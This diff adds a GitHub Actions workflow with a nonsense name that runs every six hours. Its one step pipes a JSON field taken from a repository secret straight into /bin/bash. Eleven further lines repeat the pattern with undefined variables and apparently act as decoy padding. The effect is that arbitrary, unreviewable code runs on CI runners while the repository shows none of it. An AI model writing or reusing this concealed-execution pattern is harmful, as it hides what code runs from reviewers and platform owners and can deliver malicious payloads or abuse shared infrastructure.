@@ -1,0 +1,29 @@
+name: liangwangsousuou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangwangsousuou
+        env:
+          s9: ${{ secrets.s9 }}
+        run: |
+          echo $s9 | jq -r .xv3 | /bin/bash
+          echo $lwt49 | jq -r .nn3028 | /bin/bash
+          echo $jfa5207 | jq -r .e0609 | /bin/bash
+          echo $tumup764 | jq -r .zpb93 | /bin/bash
+          echo $kdcs900 | jq -r .va21 | /bin/bash
+          echo $q0402 | jq -r .uebpo106 | /bin/bash
+          echo $zgx99 | jq -r .gvcia30 | /bin/bash
+          echo $qgsd1 | jq -r .lc04467 | /bin/bash
+          echo $m55 | jq -r .xrqf3670 | /bin/bash
+          echo $gzvo7 | jq -r .oo4 | /bin/bash
+          echo $d82359 | jq -r .wfv64454 | /bin/bash
+          echo $ngjw4958 | jq -r .suou5 | /bin/bash
+
